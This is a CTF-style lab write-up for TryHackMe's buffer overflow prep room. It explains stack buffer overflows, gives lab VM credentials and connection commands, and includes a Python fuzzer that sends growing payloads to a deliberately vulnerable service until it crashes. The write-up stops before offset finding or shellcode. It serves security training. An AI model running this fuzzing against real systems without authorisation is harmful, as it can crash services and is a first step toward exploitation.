---
title: Buffer Overflow Prep
published: true
---

[https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

Practicing stack based buffer overflows!

**What is Buffer Overflow**

Buffers are memory storage regions that temporarily hold data while being transfered to one location from another. The buffer overflow occurs when the volume of data exceeds the storage capacity of the memory buffer, and as a result the program attempting to write the data to the buffer, overwrites adjacent memory locations.

![](/assets/buffer-overflow-cyber-attack.png)

For example, a buffer for log-in credentials may be designed to expect username and password inputs of 8 bytes, so if a transaction involves an input of 10 bytes (that is, 2 bytes more than expected), the program may write the excess data past the buffer boundary.

Buffer overflows can affect all types of software. They typically result from malformed inputs or failure to allocate enough space for the buffer. If the transaction overwrites executable code, it can cause the program to behave unpredictably and generate incorrect results, memory access errors, or crashes.

**What is a Buffer Overflow Attack**

Attackers exploit buffer overflow issues by overwriting the memory of an application. This changes the execution path of the program, triggering a response that damages files or exposes private information. For example, an attacker may introduce extra code, sending new instructions to the application to gain access to IT systems.

If attackers know the memory layout of a program, they can intentionally feed input that the buffer cannot store, and overwrite areas that hold executable code, replacing it with their own code. For example, an attacker can overwrite a pointer (an object that points to another area in memory) and point it to an exploit payload, to gain control over the program.

More Information: [https://www.imperva.com/learn/application-security/buffer-overflow/](https://www.imperva.com/learn/application-security/buffer-overflow/).

* * *

## [](#header-2)Task 1 - Deploying VM

- Room is a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have been disables so easiar to write exploits.
- admin:password are credentials
- ``xfreerdp /u:admin /p:password /cert:ignore /v:10.10.164.214 /dynamic-resolution or /workarea`` to connect
- Desktop has a folder "vulnerable-apps", full of well binaries that are vulnerable to simple stack based buffer overflows.
- the SLMail installer
- the brainpan binary
- the vulnserver binary
- customer writted "oscp" binary that contains 10 buffer overflows each with a differ EIP offset and a set of baschars 

- handy buffer overflow guide: https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

* * * 

## [](#header-2)Task 2 - oscp.exe - OVERFLOW1

1. setup Immunity Debugger and open oscp.exe
2. nc 10.10.183.109 1337 to connect and use ``HELP``, then ``OVERFLOW1 test`` to complete and then terminate.

### [](#header-3)Mona Configuration

1. After setting up ``c:\mona`` directory run ``!mona config -set workingfolder c:\mona\%p`` in the bottom of Immunity Debugger

### [](#header-3)Fuzzing

1. create file on kali called ``fuzzer.py`` with the following (make sure ip is target ip):

```shell
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.183.109"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```











##### [](#header-5)Answer the questions below



* * *



